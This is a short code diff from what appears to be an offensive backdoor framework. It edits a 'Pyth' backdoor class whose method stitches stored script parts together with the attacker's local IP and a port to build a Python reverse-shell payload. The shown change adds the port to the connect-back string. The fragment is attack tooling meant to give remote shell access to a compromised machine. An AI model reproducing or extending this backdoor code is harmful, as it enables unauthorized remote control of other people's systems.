@@ -1,4 +1,4 @@
-from backdoors.backdoor import *
+from backdoors.backdoor import * 
 
 class Pyth(Backdoor):
     prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
@@ -27,7 +27,7 @@ class Pyth(Backdoor):
         with open ("backdoors/shell/pythScript/pythPart1", "r") as myfile:
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.core.localIP
+        stringToAdd+=data + self.core.localIP + "\", " + str(self.get_value("port"))
 
         with open ("backdoors/shell/pythScript/pythPart2", "r") as myfile:
             data=myfile.read()
